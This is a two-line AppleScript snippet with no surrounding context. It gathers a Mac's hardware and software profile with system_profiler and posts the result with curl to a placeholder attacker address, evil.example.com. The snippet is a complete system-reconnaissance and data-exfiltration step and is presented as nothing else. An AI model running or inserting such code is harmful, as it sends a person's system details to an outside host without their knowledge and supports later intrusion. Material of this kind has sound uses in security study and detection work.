set info to do shell script "system_profiler SPHardwareDataType SPSoftwareDataType"
do shell script "curl -X POST -d " & quoted form of ("info=" & info) & " http://evil.example.com/report"
